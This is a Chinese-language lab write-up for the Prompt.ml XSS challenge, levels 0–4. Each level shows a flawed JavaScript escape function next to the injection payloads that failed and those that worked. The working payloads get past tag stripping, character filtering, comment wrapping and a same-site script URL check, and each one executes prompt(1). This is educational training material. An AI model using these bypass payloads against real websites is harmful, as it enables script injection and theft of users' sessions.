# [Prompt.ml](https://prompt.ml) 实验 writeup

## 0
```js
function escape(input) {
    // warm up
    // script should be executed without user interaction
    return '<input type="text" value="' + input + '">';
}      
```

注入点在于input标签内的value属性，即`'<input type="text" value="' + input + '">'`

所以注入：`"><script>prompt(1)</script>`.

## 1
过滤函数为：
```js
function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}    
```
js中的正则表达式有两种形式：
- 使用一个正则表达式字面量，其由包含在斜杠之间的模式组成 ，例如：`var re = /ab+c/;`；
- 或者调用RegExp对象的构造函数,例如：`var re = new RegExp("ab+c");` 

上面的正则表达式，将 <...> 和</...> 不区分大消息全被过滤为空字符。显然需要可以使用html实体编码来绕过。

html实体编码：
- `&lt;` 或 `&#60;` 表示 < ；
- `&gt;`	`&#62;` 表示 >	大于号

尝试注入：`&#60;script&#62;prompt(1)&#60;/script&#62;` 不成。
尝试注入：`<img src="1" onerror="prompt(1)"`，成功。
尝试注入：`<body onload="prompt(1)"\\`，成功

## 2
```js
function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}    
```

正则是替换了 = 和 ( 为空字符。

`&lpar;`表示（

尝试注入：
```
<script>prompt`1`</script>
&lt;script&gt;prompt&#40;1&#41;&lt;/script&gt;
<svg onload&#61;prompt`1`>
<body onload&#61;prompt`1`>
<img src=1 onerror&#61;prompt`1`>

```

不成功，但有趣的是注入下列语句能弹出alert：

```
<script>alert`1`</script>
```
尝试下列成功:
```
<svg><script>prompt&#40;1)</script>
<script>eval.call`${'prompt\x281)'}`</script>
```

## 3
```js
function escape(input) {
    // filter potential comment end delimiters
    input = input.replace(/->/g, '_');

    // comment the input to avoid script execution
    return '<!-- ' + input + ' -->';
}
```

过滤函数将 - ， >转为_ ,并将输入内容全部置入注释中。

尝试失败的payload：
```
--&gt;<svg><script>prompt(1)</script><!--
\x2d\x2d\x3E<body onload="prompt(1)"><!--1
-&#x2D;><script>eval.call`${'prompt\x281)'}`</script><!--1
&#x2d;&#x2d;&#x3E;<script>eval("prompt(1)");</script><!--1
```

尝试下列成功：
```
--!><script>eval("prompt(1)");</script><!--1
1--!><img src=1 onerror="prompt(1)"><!--12
--!><svg><script>prompt(1);</script>
```

## 4
```js
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}       
```

decodeURIComponent() 函数可对 encodeURIComponent() 函数编码的 URI 进行解码。
  

尝试下列payload 失败：
```
http://prompt.ml/js/test.js%22><script>prompt(1);</script>%22
```

http%3A%2F%2Fprompt.ml%2Fjs%2Ftest.js%22%3E%3Cscript%3Eprompt(1)%3C%2Fscrip%3E


http://prompt.ml%2f@github.com/hhhparty/security/blob/master/courses/webtestguide/labs/prompt.js